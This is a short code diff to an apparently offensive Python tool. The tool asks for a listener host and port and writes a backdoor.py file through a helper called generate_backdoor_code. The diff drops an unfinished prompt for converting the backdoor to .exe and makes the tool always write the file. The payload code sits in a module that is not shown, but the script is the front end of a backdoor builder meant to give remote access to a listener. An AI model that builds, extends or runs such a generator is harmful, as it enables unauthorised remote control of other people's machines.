@@ -12,16 +12,10 @@ while True:
     if choice == '1':
         lhost = input("Type the listener host address >> ")
         lport = input("Type the listener port >> ")
-        convert = input("Do you want to convert the backdoor to .exe ? (y/n) >> ").lower()
-        if (convert == 'y'):
-            pass
-        else:
-            file = open("backdoor.py", "w")
-            string_code = utils.generate_backdoor_code(lhost, lport)
-            file.write(string_code)
-            file.close()
-        
-
+        file = open("backdoor.py", "w")
+        string_code = utils.generate_backdoor_code(lhost, lport)
+        file.write(string_code)
+        file.close()
         system("clear")
         utils.draw_main_menu()
         print("\n[+] - Backdoor was generated!\n")
